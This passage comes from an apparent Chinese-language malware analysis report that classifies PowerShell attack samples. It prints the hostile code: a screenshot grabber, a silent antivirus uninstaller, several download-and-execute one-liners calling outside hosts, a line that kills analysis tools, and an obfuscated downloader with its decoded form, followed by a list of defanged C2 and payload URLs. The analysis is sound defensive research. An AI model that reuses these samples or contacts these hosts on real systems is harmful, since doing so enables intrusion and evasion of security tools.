                $FileName += '-'
                $FileName += "$($Time.Day)"
                $FileName += '-'
                $FileName += "$($Time.Year)"
                $FileName += '-'
                $FileName += "$($Time.Hour)"
                $FileName += '-'
                $FileName += "$($Time.Minute)"
                $FileName += '-'
                $FileName += "$($Time.Second)"
                $FileName += '.png'
                [String] $FilePath = (Join-Path $Path $FileName)
                Get-Screenshot
                Start-Sleep -Seconds $Interval
            }
            While ((Get-Date -Format HH:mm) -lt $EndTime)
        }
        Catch {Write-Error $Error[0].ToString() + $Error[0].InvocationInfo.PositionMessage}
    }
    Get-TimedScreenshot -Path "$env:userprofileDesktop" -Interval 2 -EndTime 24:00
对于此类攻击，PowerShell代码只是攻击者在行动中使用的整套工具集中的一小部分，攻击者利用PowerShell代码以节省所需功能的研发时间。在这种攻击情况下，Excel宏文档首先会对内嵌的PowerShell进行解码运行并开始抓取屏幕截图，与此同时，宏也解码运行了其他PE文件执行后续攻击动作。
图7. Excel宏对内嵌的PowerShell脚本及PE文件进行解码
**4.26 Remove AV（2个样本，占比0.05%）**
此类变种利用PowerShell强制卸载x86系统和x64系统下的反病毒软件，它遍历注册表中程序卸载键值，查找含有“*AVG*“的条目，在后台静默卸载所找到的每个实例。
    $uninstall32s = gci "HKLM:SOFTWAREWow6432NodeMicrosoftWindowsCurrentVersionUninstall" | foreach { gp $_.PSPath } | ? { $_ -like "*AVG*" } | select UninstallString;$uninstall64s = gci "HKLM:SOFTWAREMicrosoftWindowsCurrentVersionUninstall" | foreach { gp $_.PSPath } | ? { $_ -like "*AVG*" } | select UninstallString;foreach($uninstall64 in $uninstall64s) {$uninstall64 = $uninstall64.UninstallString -Replace "MsiExec.exe","" -Replace "/I","" -Replace "/X","";$uninstall64 = $uninstall64.Trim();if($uninstall64 -like "*/mode=offline*"){}else{Write-Warning $uninstall64; start-process "msiexec.exe" -args "/x $uninstall64  /qn /norestart" -Wait }};foreach($uninstall32 in $uninstall32s) {$uninstall32 = $uninstall32.UninstallString -Replace "MsiExec.exe","" -Replace "/I","" -Replace "/X","";$uninstall32 = $uninstall32.Trim();if($uninstall32 -like "*/mode=offline*"){}else{Write-Warning $uninstall32; start-process "msiexec.exe" -args "/x $uninstall32  /qn /norestart" -Wait }};
**（五）其他小众类别** ****
在对样本进行尽可能细的分类之后，还有大约100个样本无法具体归到某一类中，这些样本通常使用了上文所述技术的定制组合。在此我会对其中值得注意的一些样本做个简单描述。
**4.27 Hidden Messages**
这个样本通过PowerShell将当前时间与内置时间进行比较，如果当前时间早于内置时间，样本则放弃运行。在代码尾部，攻击者留下了一个注释以表明他们所属的黑客组。
    if ((Get-Date).Ticks -lt (Get-Date -Date '18-jan-2017 00:00:00').Ticks) {(New-Object System.Net.WebClient).DownloadFile('http://drobbox-api.dynu[.]com/update',"$env:tempupdate");Start-Process pythonw.exe "$env:tempupdate 31337"};#NIXU17{pow3r_t0_the_sh3lls}
另一个样本也留下了一些隐藏信息，如下所示：
    while($true){Start-Sleep -s 120; $m=New-Object System.Net.WebClient;$pr = [System.Net.WebRequest]::GetSystemWebProxy();$pr.Credentials=[System.Net.CredentialCache]::DefaultCredentials;$m.proxy=$pr;$m.UseDefaultCredentials=$true;$m.Headers.Add('user-agent', 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 7.1; Trident/5.0)'); iex(($m.downloadstring('
    https://raw.githubusercontent.com/rollzedice/js/master/drupal.js
      ')));}
分析该样本从GitHub上所下载的drupal.js文件，该脚本文件会终止PowerShell进程，并输出“Hello SOC/IR team!
:-)“信息。鉴于文件中多处使用了“Test”字符串，我认为它可能是渗透测试或攻防演练中所用的脚本文件。
图8. 结束PowerShell进程的JavaScript文件
**4.28 Process Killing**
此样本使用PowerShell完成特定目的，通常用来终止与恶意软件分析相关的多个进程。
    kill -processname Taskmgr, ProcessHacker*, Procmon*, Procexp*, Procdump* -force
**4.29 Layers of Obfuscation**
这是本文分析的最后一个样本，它似乎与“PowerSploit GTS”变种中的代码有关，两者使用的原始宏基本一致，但此样本没有使用“PowerSploit
GTS”的其他代码。
该样本使用多层混淆技术以掩盖其攻击行为。
第一层：
带有宏的Excel文档从单元格中提取base64编码的数据，将数据传递给PowerShell的EncodedCommand参数加以运行。
第二层：
解码后的base64数据是一长串int类型数组，转换为char型字符串后作为另一个PowerShell脚本运行。
    -JOIn (( 32 ,32 , 36 ,86 ,115 , 110 , 50,108 , 54, 32 ,61 , 32,32 , 91,116,121,112,101, 93 ,40 ,34,123 ,51 , 125 , 123, 48 ,125, 123, 49, 125, ,53, 45 ,49, 54,55 , 45,39, 44 ,39 ,101 , 46 , 97, 109, 97 , 122 ,111,110 ,97, 39, 44, 39 ,53,39, 44,39, 119 , 115, 46, 99 , 111 , 109 ,58, 56 , 48 , 39 ,44 ,39,45 , 119, 101 ,115 , 39,41, 41 , 59)|%{([inT]$_-AS [chAr]) } ) | iex
第三层：
解码后的数据使用了多种技术对自身进行混淆处理。第一种技术是在其他字符之间插入反引号字符，该字符将在运行时被忽略。这种技术与命令行中的字符注入技术类似。
第二种技术是在其他脚本语言中常见的技术，通过将字符串拆分为随机列表，通过调用特定值完成原始字符串的重建。
    $Vsn2l6 =  [type]("{3}{0}{1}{2}" -F'UE','S','t','Net.webreq') ;  $h69Q4  =[TYPe]("{1}{2}{3}{4}{0}"-F 'he','nEt.C','REDeNtialC','a','c') ;  ${J}=&amp;("{0}{1}{2}"-f 'new-obj','ec','t') ("{2}{1}{0}{3}" -f 'eb','.w','net','client');${j}."PRo`XY"=  ( VaRIablE  vsn2L6 ).VaLuE::("{0}{3}{2}{4}{1}"-f'GetS','Proxy','em','yst','Web').Invoke();${j}."pr`OXY"."C`RE`De`NTiALs"= (  GeT-VariaBle  H69Q4).VaLUe::"DE`Faultcred`en`TI`ALS";.("{0}{1}"-f 'I','EX') ${J}.("{1}{3}{2}{0}" -f 'string','do','load','wn').Invoke(("{3}{1}{9}{11}{8}{13}{0}{4}{15}{5}{10}{2}{12}{14}{7}{6}" -f'5','tp://','mput','ht','.us','t','0/anSfrf','8','185-','e','-2.co','c2-35-167-','e.amazona','5','ws[.]com:80','-wes'));
以下是对代码进行清理后的版本，可知其功能是远程下载代码并通过Invoke-Expression执行代码。
    $Vsn2l6 = [type]Net.webreqUESt;
    $h69Q4 = [TYPe]nEt.CREDeNtialCache;
    &amp;new-object net.webclient;
    PRoXY= $Vsn2l6.VaLuE::GetSystemWebProxy.Invoke();
    prOXY.CREDeNTiALs = ( GeT-VariaBle $h69Q4 ).VaLUe::DEFaultcredenTIALS;
    .IEX downloadstring.Invoke(http://ec2-35-167-185-55.us-west-2.compute.amazonaws[.]com:8080/anSfrf);
**五、结论**
PowerShell是一个强大的脚本框架，可以提供很多功能，不管是防御方面的功能还是攻击方面的功能。希望本文能够覆盖当前工具和攻击中PowerShell所使用的一些先进技术点。
通过本文所分析的样本，我们可知大多数攻击活动依然依赖于公共工具的使用，这也在我们的意料之中。随着PowerShell框架不断得到探索和成熟，我认为在将来人们可以看到利用PowerShell开展攻击的更多形态。随着对PowerShell使用方式的逐步创新，攻击者将开始使用PowerShell以利用系统的更多原生功能，而不仅仅是现阶段对PowerShell常见功能的使用。
**六、捕获的C2服务器地址或下载链接**
    6.1 Downloader DFSP
    675hxxp://94[.]102.53.238/~yahoo/csrsv.exe
    244hxxp://89[.]248.170.218/~yahoo/csrsv.exe
    132hxxp://94[.]102.58.30/~trevor/winx64.exe
    70hxxp://80[.]82.64.45/~yakar/msvmonr.exe
    24hxxp://89[.]248.166.140/~zebra/iesecv.exe
    18hxxp://cajos[.]in/0x/1.exe
    14hxxp://93[.]174.94.137/~karma/scvhost.exe
    6hxxp://ddl7[.]data.hu/get/0/9507148/Patload.exe
    5hxxp://nikil[.]tk/p1/Pa_001.exe
    5hxxp://185[.]45.193.17/update.exe
    5hxxp://185[.]141.27.28/update.exe
    4hxxps://a[.]pomf.cat/xsakpo.exe
    4hxxp://185[.]141.27.35/update.exe
    3hxxp://www[.]macwizinfo.com/updates/anna.exe
    3hxxp://worldnit[.]com/opera.exe
    3hxxp://doc[.]cherrycoffeeequipment.com/nw/logo.png
    3hxxp://185[.]141.25.142/update.exe
    3hxxp://185[.]117.75.43/update.exe
    3hxxp://185[.]106.122.64/update.exe
    2hxxp://185[.]141.25.243/file.exe
    2hxxp://185[.]141.27.32/update.exe
    2hxxp://185[.]141.27.34/update.exe
    2hxxp://andersonken4791[.]pserver.ru/doc.exe
    2hxxp://boisedelariviere[.]com/backup/css/newconfig.exe
    2hxxp://brokelimiteds[.]in/wp-admin/css/upload/Order.exe
    2hxxp://ddl7[.]data.hu/get/0/9499830/money.exe
    2hxxp://fetzhost[.]net/files/044ae4aa5e0f2e8df02bd41bdc2670b0.exe
    2hxxp://hnng[.]moe/f/InX
    2hxxp://hnng[.]moe/f/Iot
    2hxxp://labid[.]com.my/m/m1.exe
    2hxxp://labid[.]com.my/power/powex.exe
    2hxxp://labid[.]com.my/spe/spendy.exe
    2hxxp://lvrxd[.]3eeweb.com/nano/Calculator.exe
    2hxxp://matkalv[.]5gbfree.com/loso/fasoo.exe
    2hxxp://net[.]gethost.pw/windro.exe
    2hxxp://nikil[.]tk/i1/iz_001.exe
    2hxxp://rgho[.]st/68lJcGFLW
    2hxxp://rgho[.]st/6hrkjYlX4
    2hxxp://toxicsolutions[.]ru/upload/praisefud.exe
    2hxxp://worldnit[.]com/KUKU.exe
    2hxxp://worldnit[.]com/kundelo.exe
    2hxxp://worldnit[.]com/operamini.exe
    2hxxp://www[.]wealthandhealthops.com/modules/mod_easyblogquickpost/lawdsijdoef.exe
    2hxxps://a[.]pomf.cat/drktzz.exe
    2hxxps://a[.]pomf.cat/dwnysn.exe
    2hxxps://a[.]pomf.cat/dwnysn.exe
    2hxxps://a[.]pomf.cat/hsmqrh.exe
    2hxxps://a[.]pomf.cat/mjnspx.exe
    2hxxps://a[.]pomf.cat/pabfzv.exe
    2hxxps://a[.]pomf.cat/qolcls.exe
    2hxxps://a[.]pomf.cat/tpaesb.exe
    2hxxps://a[.]pomf.cat/ultxkr.exe
    2hxxps://a[.]pomf.cat/vhcwbo.exe
    2hxxps://a[.]pomf.cat/vjadwb.exe
    2hxxps://a[.]pomf.cat/wopkwj.exe
    2hxxps://a[.]pomf.cat/yspcsr.exe
    2hxxps://www[.]dropbox.com/s/gx6kxkfi7ky2j6f/Dropbox.exe?dl=1